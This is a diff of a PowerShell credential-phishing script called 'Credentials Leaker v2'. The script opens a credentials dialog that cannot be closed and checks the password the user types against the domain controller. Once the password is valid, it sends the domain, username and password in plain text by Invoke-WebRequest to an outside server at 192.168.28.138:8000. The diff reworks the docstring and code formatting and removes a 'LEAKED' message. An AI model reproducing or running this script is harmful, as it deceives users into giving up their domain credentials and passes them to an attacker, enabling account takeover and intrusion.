@@ -1,5 +1,20 @@
-# This script will allow attackers to leak users credentials to external web servers.
-# In order to do so, run "python -m SimpleHTTPServer" and add the IP to the script below.
+'''
+Credentials Leaker v2 By Dviros
+
+This script will display a powershell credentials box that will ask the user for his credentials.
+
+The box cannot be closed (only by killing the process) and it keeps checking the credentials against the DC. If its valid, it will close and leak it to a web server outside.
+
+TODO:
+- Box title should be changed.
+- Different windows versions has different credential boxes. Needs to be pulled from WINAPI.
+
+
+
+'''
+###########################################################################################################
+
+
 
 
 $username = $env:USERNAME
@@ -17,26 +32,24 @@ function Credentials(){
             Credentials
         }
         else {
-        $password = $creds.GetNetworkCredential().password
-        $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
-        $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$username,$password)
+            $password = $creds.GetNetworkCredential().password
+            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
+            $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$username,$password)
 
-        if ($domain.name -eq $null){
-            Credentials
-        }
-        else
-        {
-            try{
-            Invoke-WebRequest http://192.168.28.138:8000/$CurrentDomain_1";"$username";"$password -Method Get
+            if ($domain.name -eq $null){
+                Credentials
             }
-            catch{
-            write-host "LEAKED"
+            else {
+                try{
+                Invoke-WebRequest http://192.168.28.138:8000/$CurrentDomain_1";"$username";"$password -Method Get
+                }
+                catch{}
+
+                $status = $false
+                exit
             }
-            $status = $false
-            exit
         }
-      }
-   }
+    }
 }
 
 
